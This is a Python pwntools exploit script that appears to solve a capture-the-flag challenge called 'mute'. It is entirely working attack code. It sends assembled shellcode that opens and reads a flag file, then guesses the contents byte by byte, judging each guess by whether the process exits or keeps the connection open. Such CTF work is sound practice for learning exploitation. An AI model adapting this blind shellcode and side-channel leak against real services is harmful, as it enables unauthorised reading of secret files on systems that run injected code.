#!/usr/bin/env python

from pwn import *
import string

elf = ELF("./mute")
context.binary = elf

def connect():
    global p
    p = process(elf.file.name)
    p.recvline()


def tryChar(c,index):
    # Connect to the service
    connect()

    # Read in file
    shellcode = shellcraft.open("./flag",constants.O_RDONLY,None)
    shellcode += shellcraft.read(3,count=256)

    # Default is to exit
    shellcode += "xor eax, eax\n"
    shellcode += "mov edi, 0\n" # Read from stdin, effectively holding the connection open
    shellcode += "mov r8, 60\n" # What we will conditionally move (exit call)

    # Load up 64-bits at a time
    shellcode += "mov rbx, [rsp + {0}*8]\n".format(index/8)

    # Shift over to the char we're actually comparing against
    shellcode += "shr rbx, {0}\n".format(8*(index%8))

    # Perform the comparison with our guess
    shellcode += "cmp bl, {0}\n".format(ord(c))

    # Conditionally change our call to exit if we guessed wrong
    shellcode += "cmovne rax, r8\n"

    # Execute whichever syscall we have queued up
    # Notice there's no jmp call :-)
    shellcode += "syscall\n"

    # Sometimes we ended up with newline chars, just ask pwntools to remove them
    shellcode = encoders.encode(asm(shellcode),avoid="\n")

    # Pad our shellcode out to the correct length
    shellcode += "\x00" * (0x1000 - len(shellcode))

    # Send it
    p.send_raw(shellcode)

    # Try reading
    try:
        p.recvline(timeout=0.5)
    except:
        # Connection closed on us, wrong guess
        p.close()
        return False

    # Connection stayed open, correct guess
    p.close()
    return True

flag = ""

# Not specifying stop here since we don't know how long the flag is
while True:

    # Guess every character
    for c in string.printable:

        # If we found this char, break and move to the next
        if tryChar(c,len(flag)):
            print("Found char: " + c)
            flag += c
            break

    else:
        # If we hit this, we're probably done reading the flag
        break

print("Flag: " + flag)
